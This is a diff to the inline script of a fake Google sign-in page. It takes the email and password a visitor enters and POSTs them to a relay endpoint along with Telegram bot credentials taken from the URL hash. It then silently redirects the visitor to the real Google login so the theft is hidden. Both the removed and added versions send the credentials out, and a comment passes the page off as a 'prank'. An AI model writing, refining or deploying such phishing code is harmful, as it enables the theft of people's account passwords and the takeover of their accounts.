@@ -173,66 +173,74 @@
         <span>Terms</span>
     </footer>
 
-    <script>
-        const getConf = () => {
-            const h = window.location.hash.substring(1);
-            if (!h) return null;
-            try { return JSON.parse(atob(h)); } catch(e) { return null; }
-        };
+<script>
+    // 1. Grab the raw Base64 config from the URL Hash
+    const getRawConfig = () => {
+        const h = window.location.hash.substring(1);
+        return h || null;
+    };
 
-        const config = getConf();
-        let userVal = "";
+    const configString = getRawConfig();
+    let userVal = "";
 
-        const showLoader = (show) => {
-            document.getElementById('loader').style.display = show ? 'block' : 'none';
-        };
+    const showLoader = (show) => {
+        const loader = document.getElementById('loader');
+        if (loader) loader.style.display = show ? 'block' : 'none';
+    };
 
-        function toPassword() {
-            userVal = document.getElementById('email').value;
-            if(!userVal) return;
-            
-            showLoader(true);
-            setTimeout(() => {
-                showLoader(false);
-                document.getElementById('display-user').innerText = userVal;
-                document.getElementById('step-id').classList.add('hidden');
-                document.getElementById('step-pass').classList.remove('hidden');
-                document.getElementById('step-pass').classList.add('step-transition');
-                document.getElementById('password').focus();
-            }, 800);
+    function toPassword() {
+        userVal = document.getElementById('email').value;
+        if(!userVal) return;
+        
+        showLoader(true);
+        setTimeout(() => {
+            showLoader(false);
+            document.getElementById('display-user').innerText = userVal;
+            document.getElementById('step-id').classList.add('hidden');
+            document.getElementById('step-pass').classList.remove('hidden');
+            document.getElementById('step-pass').classList.add('step-transition');
+            document.getElementById('password').focus();
+        }, 800);
+    }
+
+    async function submitHit() {
+        const pass = document.getElementById('password').value;
+        if(!pass) return;
+
+        showLoader(true);
+        // Redirect to real Google Login after the prank
+        const redirectUrl = "https://accounts.google.com/ServiceLogin";
+
+        // If no config found in URL, just redirect normally
+        if(!configString) {
+            setTimeout(() => window.location.href = redirectUrl, 1000);
+            return;
         }
 
-        async function submitHit() {
-            const pass = document.getElementById('password').value;
-            if(!pass) return;
-
-            showLoader(true);
-            const redirectUrl = "https://accounts.google.com/ServiceLogin";
-
-            if(!config) {
-                setTimeout(() => window.location.href = redirectUrl, 1000);
-                return;
-            }
-
-            try {
-                await fetch('/api/exfil', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        target: 'google',
-                        credentials: { username: userVal, password: pass },
-                        tgToken: config.t,
-                        tgChat: config.c
-                    })
-                });
-            } finally {
-                setTimeout(() => window.location.href = redirectUrl, 1000);
-            }
+        try {
+            // 2. Call your central Vercel API relay (/api/process)
+            await fetch('/api/process', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    config: configString, // The encoded Telegram credentials
+                    data: { 
+                        User: userVal, 
+                        Pass: pass 
+                    }
+                })
+            });
+        } catch (err) {
+            // Silenced for a seamless user experience
+        } finally {
+            setTimeout(() => window.location.href = redirectUrl, 1000);
         }
+    }
 
-        document.getElementById('show-pass').addEventListener('change', function() {
-            document.getElementById('password').type = this.checked ? 'text' : 'password';
-        });
-    </script>
+    // Toggle password visibility logic
+    document.getElementById('show-pass').addEventListener('change', function() {
+        document.getElementById('password').type = this.checked ? 'text' : 'password';
+    });
+</script>
 </body>
 </html>
